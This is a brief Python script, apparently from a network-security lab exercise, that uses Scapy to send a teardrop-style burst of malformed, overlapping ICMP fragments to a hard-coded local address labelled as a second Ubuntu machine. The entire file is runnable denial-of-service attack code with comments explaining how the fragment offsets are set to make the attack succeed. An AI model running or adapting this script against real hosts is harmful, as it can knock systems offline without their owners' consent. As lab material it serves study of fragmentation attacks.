from scapy.all import *

# Function that sends malformed packets to the taget_ip address
def send_teardrop_fragments(ip):
	#creating the first packet with "MF"- More Fragments Flag:
	packet_1 = IP(dst=ip, id=12345, frag=0, flags="MF") / ICMP(type=8, code=0) / \
	("X" * 1024)
	send(packet_1)
	#Send the following 6 malformed packets:
	for i in range (1, 7):
		# frag flag has incorrect offset to make it successful.
		packet = IP(dst=ip, id=12345, frag=i, flags="MF") / \
		ICMP(type=8, code=0) / ("X" * 1024)
		send(packet)
	#Send in the last packet without the "MF" flag:
	packet_8 = IP(dst=ip, id=12345, frag=0) / ICMP(type=8, code=0) / \
	("X" * 1024)
	send(packet_8)

target_ip = "10.0.2.4" #Ubuntu2's address
send_teardrop_fragments(target_ip)